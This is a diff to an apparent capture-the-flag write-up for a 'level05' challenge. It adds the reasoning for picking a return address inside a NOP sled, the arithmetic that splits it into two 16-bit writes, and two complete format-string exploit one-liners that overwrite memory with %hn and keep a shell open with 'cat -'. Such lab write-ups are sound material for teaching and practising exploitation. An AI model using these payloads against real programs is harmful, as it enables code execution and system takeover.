@@ -154,9 +154,25 @@ End of NOP sled => 0xffffdba4 + 0x3E8 = 0xffffdf8c
 
 Right after NOP sled  => 0xffffdf8c → shellcode starts
 
-solution 1) 
+solution 1) 0xffffdc64
+
+We choose 0xffffdc64 because it is inside the NOP sled range 
+(0xffffdba4 → 0xffffdf8c), making the exploit reliable.
+
+Split address 0xffffdc64:
+
+LOW  = 0xdc64 = 56420
+HIGH = 0xffff = 65535
+
+Already printed = 8 bytes
+
+padding1 = 56420 - 8 = 56412
+padding2 = 65535 - 56420 = 9115
 
 (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56412c"+"%10$hn"+"%9115c"+"%11$hn"' ;cat -) | ./level05
+
+
+
 solution 2) 
 
 (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56312c"+"%10$hn"+"%9215c"+"%11$hn"' ;cat -) | ./level05
